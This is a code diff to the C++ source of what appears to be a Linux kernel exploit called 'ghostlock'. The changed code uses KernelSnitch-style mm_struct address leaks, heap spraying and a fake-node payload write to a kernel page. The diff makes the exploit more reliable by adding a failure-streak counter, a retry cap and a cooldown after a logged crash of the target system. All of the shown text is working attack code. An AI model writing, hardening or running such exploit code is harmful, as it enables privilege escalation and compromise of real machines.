@@ -484,6 +484,14 @@ namespace ghostlock::support {
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
      * paths, then delete this comment and the residual row. */
+    /* v11.3: avalanche guard state. The 2026-10-02 23:12 run burned 7
+     * back-to-back KernelSnitch mm-leak scans (~10s each, zero gap between
+     * attempts) and took the system down at ~78s (killProcesses + init
+     * SIGABRT). Cooldown between failed attempts plus a hard cap on the
+     * consecutive mm-leak failure streak keeps the retry loop from
+     * re-creating that. */
+    static int32_t g_mm_leak_fail_streak = 0;
+
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
@@ -620,6 +628,7 @@ namespace ghostlock::support {
             leaked < kernel::KERNELSNITCH_IDENTITY_START ||
             leaked >= kernel::g_direct_map_end) {
             pr_warning("KernelSnitch mm_struct leak failed\n");
+            g_mm_leak_fail_streak++;
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                 kill_child(prepare_ctx.childs[i]);
@@ -726,6 +735,7 @@ namespace ghostlock::support {
         for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
             uintptr_t base = prepare_kernel_page(&request);
             if (base) {
+                g_mm_leak_fail_streak = 0;
                 memory::PayloadWriteLayout layout = {
                     .parent = (session::g_exploit_session.heap.current.fake_parent),
                     .right = (session::g_exploit_session.heap.current.fake_right),
@@ -751,8 +761,17 @@ namespace ghostlock::support {
                 pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                 break;
             }
-            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
-                       max_attempts, ms_since(&t_good));
+            /* v11.3: each failed attempt costs a full ~10s mm-leak scan; seven
+             * zero-gap cycles matched the 23:13:44 system avalanche exactly.
+             * Cap the streak and cool down before the next scan. */
+            if (g_mm_leak_fail_streak >= 6) {
+                pr_warning("mm-leak failed %d consecutive scans; stopping prepare "
+                           "to avoid futex residue avalanche\n", g_mm_leak_fail_streak);
+                break;
+            }
+            pr_warning("prepare_kernel_page retry %u/%u +%lldms (streak=%d, cooldown 2s)\n",
+                       attempt, max_attempts, ms_since(&t_good), g_mm_leak_fail_streak);
+            usleep(2000000);
         }
         return 0;
     }
